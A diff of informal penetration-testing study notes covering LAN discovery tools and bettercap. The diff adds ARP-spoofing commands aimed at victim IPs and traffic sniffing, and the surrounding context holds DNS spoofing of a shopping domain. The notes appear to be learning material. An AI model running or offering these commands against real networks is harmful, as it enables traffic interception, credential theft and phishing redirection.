@@ -78,12 +78,14 @@ max
 [angry ip scanner]
 [netdiscover]
 sudo netdiscover -i wlan0 -r 192.168.1.1
-[KISMET] sudo bettercap -caplet http-ui 
+[KISMET] 
 sudo kismet -c wlan1mon 
 
 [bettercap] - CLI [ettercap] - GUI
 bettercap  -iface wlan0
 sudo bettercap -caplet http-ui [UI MODE]
+[mitmproxy] 
+
 
 [commansd]
 net.show [shows whos connected to device]
@@ -157,7 +159,7 @@ ssh -T frank@192.168.1.131 "sudo timeout 60 tcpdump -i wlan0 \"not port 22 and n
 
 [arp-spoof] victim convisnced they are  talking to server, but the spoof server is listening  in  the midle]
 
-mitweb [HAS NICE GUI]
+mitmweb [HAS NICE GUI]
 
 [bettercap - GUI ]:
 sudo bettercap -caplet http-ui 
@@ -169,6 +171,14 @@ arp.spoof on
 net.sniff on [tells attacker what the victim is doing [inbound and out bound] 
 set dns.spoof.domains myebay.com [redirects to APACHE config]
 
+
+set arp.spoof.targets 192.168.1.10 [sets  spoof to victim]
+set arp.spoof.fullduplex true [sets attack to victim and  host]
+set arp.spoof.targets 192.168.43.157(IP address of the target Device)
+arp.spoof on
+
+set net.sniff.local true
+net.sniff on
 
 
 --------------------------------------------------- FIND IP FROM DOMAIN --------------------------------------
